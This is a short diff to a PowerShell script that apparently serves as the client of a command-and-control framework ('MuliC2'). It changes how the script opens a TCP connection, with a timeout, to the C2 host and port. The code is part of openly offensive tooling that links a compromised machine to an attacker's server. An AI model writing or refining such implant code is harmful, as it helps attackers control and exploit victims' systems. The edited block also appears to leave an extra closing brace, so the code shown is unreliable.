@@ -1158,15 +1158,14 @@ try {
 try {
     Write-Host "[*] Connecting to MuliC2 server at \$C2Host\`:\$C2Port..." -ForegroundColor Cyan
     
-    # Create TCP client with connection timeout
+    # Create TCP client with connection timeout (synchronous, compatible with all PowerShell)
     \$global:tcpClient = New-Object System.Net.Sockets.TcpClient
-    
-    # Set connection timeout
-    \$connectTask = \$global:tcpClient.ConnectAsync(\$C2Host, \$C2Port)
-    \$connected = \$connectTask.Wait(10000) # 10 second timeout
-    
-    if (-not \$connected -or -not \$global:tcpClient.Connected) {
+    \$asyncResult = \$global:tcpClient.BeginConnect(\$C2Host, \$C2Port, \$null, \$null)
+    \$waitSuccess = \$asyncResult.AsyncWaitHandle.WaitOne(10000, \$false)
+    if (-not \$waitSuccess -or -not \$global:tcpClient.Connected) {
         throw "Connection to \$C2Host\`:\$C2Port failed or timed out"
+    }
+    \$global:tcpClient.EndConnect(\$asyncResult)
     }
     
     Write-Host "[+] TCP connection established" -ForegroundColor Green
